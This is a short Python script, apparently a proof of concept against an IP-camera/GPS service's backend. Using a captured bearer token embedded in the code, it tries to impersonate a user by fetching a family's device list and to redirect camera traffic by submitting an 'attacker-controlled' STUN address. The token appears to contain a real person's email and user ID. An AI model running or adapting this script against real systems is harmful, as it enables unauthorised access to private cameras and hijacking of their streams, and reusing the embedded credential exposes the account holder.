import requests

# 1. Base configuration from the captured traffic
BASE_URL = "http://ipc.gps555.net"
AUTH_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InNpbHZpYS5ob3JnYUBjbm12LnJvIiwiZXhwIjoxNzY5NzMwNzc3LCJmYW1pbHlfaWQiOjAsImxhbmciOiJlbiIsIm9yaWdfaWF0IjoxNzY4NDM0Nzc3LCJyb2xlX2lkIjoyLCJ1c2VyX2lkIjo4MzQ4NTMsInVzZXJuYW1lIjoic2lsdmlhLmhvcmdhQGNubXYucm8ifQ.V6lYDCH_fJIybEhOdLAlXEoi-7mXvBXHxXr12X0fqt4"

headers = {
    "user-agent": "Dart/3.9 (dart:io)",
    "language": "en",
    "authorization": f"Bearer {AUTH_TOKEN}",
    "content-type": "application/json",
    "host": "ipc.gps555.net"
}

def attempt_impersonation():
    # Attempting to fetch device list with captured Family ID
    family_id = "834853"
    login_url = f"{BASE_URL}/api/v1/ipc/?terminalFamilyId={family_id}"
    
    print(f"Attempting impersonation login to: {login_url}")
    response = requests.get(login_url, headers=headers)
    
    if response.status_code == 200:
        print("Impersonation successful. Server accepted identifiers.")
        print(f"Device Meta: {response.text[:200]}...")
    else:
        print(f"Login failed. Status: {response.status_code}")

def attempt_redirection():
    # Attempting to redirect app by reporting a controlled STUN address
    # This modifies the device routing information as described
    stun_endpoint = f"{BASE_URL}/api/v1/ipc/send-stun-addr"
    
    # Payload modified with attacker-controlled IP/Port 
    params = {
        "appId": "4723AC85-8FEB-C05A-7788-D78D76781558",
        "publicIp": "80.57.98.98",  
        "publicPort": "62888",
        "privateIp": "192.168.72.1",
        "privatePort": "56864",
        "uid": "974754152962"
    }
    
    print(f"Attempting routing manipulation via: {stun_endpoint}")
    response = requests.get(stun_endpoint, headers=headers, params=params)
    
    if response.status_code == 200:
        print("Redirection request sent. Checking if app follows routing...")
    else:
        print("Redirection attempt rejected by backend.")

if __name__ == "__main__":
    attempt_impersonation()
    attempt_redirection()